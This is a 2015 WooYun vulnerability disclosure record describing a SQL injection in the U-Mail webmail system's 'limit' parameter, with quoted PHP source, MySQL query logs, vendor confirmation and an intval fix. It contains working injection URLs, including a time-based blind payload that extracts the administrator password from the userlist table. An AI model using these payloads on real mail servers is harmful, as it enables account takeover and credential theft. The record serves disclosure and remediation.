{"id": 44279, "wybug_id": "wooyun-2015-093712", "wybug_title": "U-Mail邮件系统注入(SQL Injections in MySQL LIMIT clause案例)", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2015-01-29 11:42", "wybug_open_date": "2015-04-29 11:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向公众公开  简要描述： SQL Injections in MySQL LIMIT clause，恰巧该邮件系统这处存在缺陷，刚好来个案例展示，通过注入可以获取管理员密码 详细说明：  漏洞产生的原因，sql语句中的limit由用户可控，其处理不当因而导致了sql注入的产生漏洞文件/client/oab/module/operates.php 代码为\nif ( ACTION == \"member-get\" ){\t\t$dept_id = gss( $_GET['dept_id'] );\t\t$dept_id = intval( $dept_id );//此处不传入该变量\t\t$keyword = gss( $_GET['keyword'] );\t\t$page = $_GET['page'] ? gss( $_GET['page'] ) : 1;\t\t$limit = $_GET['limit'] ? gss( $_GET['limit'] ) : 25;//此处的limit可控，不传入的话其值为25\t\t$orderby = gss( $_GET['orderby'] );\t\t$is_reverse = gss( $_GET['is_reverse'] );\t\t$data_cache = $Department->getDepartmentByDomainID( $domain_id, \"dept_id,name,parent_id,`order`\", 0 );\t\t$department_list = create_array( $data_cache, \"dept_id\", \"name\" );\t\t$Tree = $Department->getTreeObject( );\t\t$Tree->set_data_cache( $data_cache );\t\t$Tree->sort_data( -1, 1 );\t\t$where = \"t1.CalendarOnly='0'\";\t\tif ( $dept_id && $dept_id != \"-1\" )\t\t{\t\t\t\t$dept_ids = $Tree->get_child_id( $dept_id );\t\t\t\t$user_ids = $Department->getMailboxIDByDepartmentID( $dept_ids, 0 );\t\t\t\t$where .= \" AND t1.UserID IN (\".$user_ids.\")\";\t\t}\t\telse\t\t{\t\t\t\t$dept_permit = get_session( \"dept_permit\" );\t\t\t\tif ( $dept_permit == \"1\" )\t\t\t\t{\t\t\t\t\t\t$where_map = \"user_id='\".$user_id.\"'\";\t\t\t\t\t\t$arr_tmp = $Department->get_map( array(\t\t\t\t\t\t\t\t\"fields\" => \"*\",\t\t\t\t\t\t\t\t\"where\" => $where_map,\t\t\t\t\t\t\t\t\"orderby\" => \"dept_id\",\t\t\t\t\t\t\t\t\"debug\" => 0\t\t\t\t\t\t) );\t\t\t\t}\t\t\t\telse if ( $dept_permit == \"-1\" )\t\t\t\t{\t\t\t\t\t\t$where_permit = \"domain_id='\".$domain_id.\"' AND user_id='\".$user_id.\"'\";\t\t\t\t\t\t$arr_tmp = $Department->get_deptpermit( array(\t\t\t\t\t\t\t\t\"fields\" => \"*\",\t\t\t\t\t\t\t\t\"where\" => $where_permit,\t\t\t\t\t\t\t\t\"debug\" => 0\t\t\t\t\t\t) );\t\t\t\t}\t\t\t\tif ( $arr_tmp )\t\t\t\t{\t\t\t\t\t\t$dept_arr = array( );\t\t\t\t\t\tforeach ( $arr_tmp as $arr )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$dept_arr[] = $Tree->get_child_id( $arr['dept_id'] );\t\t\t\t\t\t}\t\t\t\t\t\t$dept_ids = implode( \",\", $dept_arr );\t\t\t\t}\t\t\t\tif ( $dept_ids )\t\t\t\t{\t\t\t\t\t\t$user_ids = $Department->getMailboxIDByDepartmentID( $dept_ids, 0 );\t\t\t\t\t\t$where .= \" AND t1.UserID IN (\".$user_ids.\")\";\t\t\t\t}\t\t}\t\tif ( $keyword )\t\t{\t\t\t\tif ( strpos( $keyword, \"@\" ) )\t\t\t\t{\t\t\t\t\t\t$key_tmp = explode( \"@\", $keyword );\t\t\t\t\t\t$keyword = $key_tmp[0];\t\t\t\t}\t\t\t\t$where .= \" AND (t1.FullName LIKE \\\"%\".$keyword.\"%\\\" OR t1.Mailbox LIKE \\\"%\".$keyword.\"%\\\")\";\t\t}\t\tswitch ( $orderby )\t\t{\t\tcase \"fullname\" :          ......\t\tcase \"email\" :\t\t\t\t$orderby = \"t1.Mailbox\";\t\t\t\tbreak;\t\t\t\t$orderby = \"\";\t\t}\t\t$arr_tmp = $Mailbox->getMailboxInfo( $domain_id, $where, $page, $limit, $orderby, $is_reverse, 0 );//todo 分析该函数\n其中$Mailbox->getMailboxInfo()函数里的逻辑如下，代码在/admin/lib/Mailbox.php\npublic function getMailboxInfo( $_obfuscate_AkPSczrCIu40, $_obfuscate_IRFhnYwÿ = \"\", $_obfuscate_AedrEgÿÿ = \"\", $_obfuscate_xvYeh9Iÿ = \"\", $_obfuscate_tUi30UB0e88ÿ = \"\", $_obfuscate_u5srL4rM3PZJLvpPhQÿÿ = FALSE, $_obfuscate_ySeUHBwÿ = FALSE )\t\t{\t\t\t\t$_obfuscate_AkPSczrCIu40 = intval( $_obfuscate_AkPSczrCIu40 );\t\t\t\t$_obfuscate_zbtFQY92OYenSG9u = \"t1.DomainID='\".$_obfuscate_AkPSczrCIu40.\"' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0\";\t\t\t\tif ( $_obfuscate_IRFhnYwÿ )\t\t\t\t{\t\t\t\t\t\t$_obfuscate_zbtFQY92OYenSG9u .= \" AND \".$_obfuscate_IRFhnYwÿ;\t\t\t\t}\t\t\t\tif ( $_obfuscate_xvYeh9Iÿ )\t\t\t\t{\t\t\t\t\t\tif ( $_obfuscate_AedrEgÿÿ )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_mV9HBLYÿ = $_obfuscate_AedrEgÿÿ * $_obfuscate_xvYeh9Iÿ - $_obfuscate_xvYeh9Iÿ;\t\t\t\t\t\t}\t\t\t\t\t\tif ( $_obfuscate_mV9HBLYÿ )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_UFlHiZJcJu6DQBFE = \"LIMIT \".$_obfuscate_mV9HBLYÿ.\",\".$_obfuscate_xvYeh9Iÿ;\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_UFlHiZJcJu6DQBFE = \"LIMIT \".$_obfuscate_xvYeh9Iÿ;//此处将获取的limit拼接志sql语句，只需要控制相应的参数为空即可\t\t\t\t\t\t}\t\t\t\t}\t\t\t\tif ( $_obfuscate_tUi30UB0e88ÿ )\t\t\t\t{\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ = \"ORDER BY \".$_obfuscate_tUi30UB0e88ÿ;\t\t\t\t\t\tif ( $_obfuscate_u5srL4rM3PZJLvpPhQÿÿ )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ .= \" DESC\";\t\t\t\t\t\t}\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ .= \",t1.FullName ASC\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ = \"ORDER BY t1.OrderNo DESC,t1.Mailbox ASC\";\t\t\t\t}\t\t\t\t$_obfuscate_mGXfswsMZQÿÿ = \"SELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\\r\\n\\t\\t\\t\\tFROM \".$this->get_table_name( \"mailbox\" ).\" as t1, \".$this->get_table_name( \"info\" ).\" as t2\\r\\n\\t\\t\\t\\tWHERE \".$_obfuscate_zbtFQY92OYenSG9u.\"\\r\\n\\t\\t\\t\\t\".$_obfuscate_5e2O0TiivW7ec4cÿ;\t\t\t\t$_obfuscate_YdwIclUMQÿÿ = $_obfuscate_mGXfswsMZQÿÿ.\" \".$_obfuscate_UFlHiZJcJu6DQBFE;\t\t\t\tif ( $_obfuscate_ySeUHBwÿ )\t\t\t\t{\t\t\t\t\t\tdump( $_obfuscate_YdwIclUMQÿÿ );\t\t\t\t}\t\t\t\t$_obfuscate_MbMfEtWGUpEscGl = $this->db_count( $_obfuscate_mGXfswsMZQÿÿ );\t\t\t\tunset( $_obfuscate_1LzzW8sGEkLaizkÿ );\t\t\t\t$_obfuscate_6RYLWQÿÿ = $this->db_select( $_obfuscate_YdwIclUMQÿÿ, \"more\" );\t\t\t\treturn array(\t\t\t\t\t\t\"count\" => $_obfuscate_MbMfEtWGUpEscGl,\t\t\t\t\t\t\"data\" => $_obfuscate_6RYLWQÿÿ\t\t\t\t);\t\t}\n该函数的调用过程为，http://mail.fuck.com/webmail/client/oab/index.php?module=operate&action=member-get普通用户登录后，执行该请求，查看sql的执行过程如下\n150124 13:53:59\t 2772 Query\tSELECT DomainName from domains\t\t 2772 Query\tSELECT UserID, Mailbox, FullName, MailDir, Password, AutoDecode, IsForwarding, AllowAccess, AllowChangeViaEmail, KeepForwardedMail, HideFromEveryone, EncryptMail, ApplyQuotas, EnableMultiPop, CanModifyGAB, CalendarOnly, MaxMessageCount, MaxDiskSpace, UserList.DomainID, Domains.DomainName, Domains.DomainID FROM UserList, Domains WHERE UserList.DomainID=Domains.DomainID AND FullName = 'mdaemon server' AND DomainName = 'fuck.com'\t\t 2772 Query\tSELECT DomainName from domains\t\t 2772 Query\tSELECT * FROM Domains\t\t 2880 Connect\tumail@localhost on \t\t 2880 Query\tSET NAMES 'UTF8'\t\t 2880 Init DB\tumail\t\t 2880 Query\tSELECT dept_id,name,parent_id,`order` FROM oab_department WHERE domain_id='1' ORDER BY `order`,`dept_id`\t\t 2880 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.CalendarOnly='0'\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2880 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.CalendarOnly='0'\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC LIMIT 25\n即LIMIT 25处是用户可控的，我们在url请求中添加limit变量，继续提交sql语句为http://mail.fuck.com/webmail/client/oab/index.php?module=operate&action=member-get&limit=1,1+PROCEDURE+analyse(extractvalue(rand(),concat(0x3a,version())),1)查看sql语句执行的情况如下\n150124 14:06:57\t 2888 Connect\tumail@localhost on \t\t 2888 Query\tSET NAMES 'UTF8'\t\t 2888 Init DB\tumail\t\t 2888 Query\tSELECT dept_id,name,parent_id,`order` FROM oab_department WHERE domain_id='1' ORDER BY `order`,`dept_id`\t\t 2888 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.CalendarOnly='0'\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2888 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.CalendarOnly='0'\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,version())),1)\t\t 2888 Quit\n如图\n\n成功插入，由于该邮件系统默认关闭了错误回显，因而我们无法直接查看结果，本地sql执行的情况为\n\n所以如想继续获取敏感信息，我们利用盲注即可，构造获取管理员密码的exp为http://mail.fuck.com/webmail/client/oab/index.php?module=operate&action=member-get&limit=1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(ascii(substr((select password from userlist where userid=2),1,1))=97, BENCHMARK(50000000,SHA1(1)),1)))),1)\n\nsql语句为\n150124 14:43:21\t 2911 Connect\tumail@localhost on \t\t 2911 Query\tSET NAMES 'UTF8'\t\t 2911 Init DB\tumail\t\t 2911 Query\tSELECT dept_id,name,parent_id,`order` FROM oab_department WHERE domain_id='1' ORDER BY `order`,`dept_id`\t\t 2911 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.CalendarOnly='0'\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2911 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.CalendarOnly='0'\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(ascii(substr((select password from userlist where userid=2),1,1))=97, BENCHMARK(50000000,SHA1(1)),1)))),1)\n\n\nok，这样即可获取管理员密码，并不鸡肋，从而获得整个邮件系统的权限了，在继续对邮件系统进行查找，发现其他三处并不存在注入，虽然limit可控，但执行了intval处理，因而不存在缺陷，如图\n\n关于limit的注入，查看社区文章http://zone.wooyun.org/content/18220 (原版链接https://rateip.com/blog/sql-injections-in-mysql-limit-clause/)感谢转载翻译的作者“五道口杀气”以及原作者() :)   漏洞证明：  如上   修复方案：  进行intval处理   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-02-02 10:36 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-29 11:46 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @一下管理果然好使。。。。瞬间审核    \n     2015-01-29 14:22 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  -.--.-.--.--.-. U-Mail系列    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}